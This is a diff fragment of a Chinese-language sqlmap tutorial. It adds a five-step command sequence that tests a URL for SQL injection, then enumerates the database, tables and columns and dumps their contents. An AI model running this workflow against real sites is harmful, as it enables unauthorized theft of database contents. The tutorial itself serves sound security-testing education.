@@ -67,3 +67,15 @@ cd python2.7
 cd sqlmap
 
 3.使用python sqlmap.py -h执行指令
+
+
+
+step1：sqlmap -u \["URL"] //测试是否存在注入&#x20;
+
+step2：sqlmap -u \["URL"] -current-db //查询当前数据库&#x20;
+
+step3：sqlmap -u \["URL"] -D \["数据库名"] --tables //查询当前数据库中的所有表&#x20;
+
+step4：sqlmap -u \["URL"] -D \["数据库名"] -T \["表名"] --columns //查询指定库中指定表的所有列(字段)&#x20;
+
+step5：sqlmap -u \["URL"] -D \["数据库名"] -T \["表名"] -C \["列名"] --dump //打印出指定库中指定表指定列中的字段内容
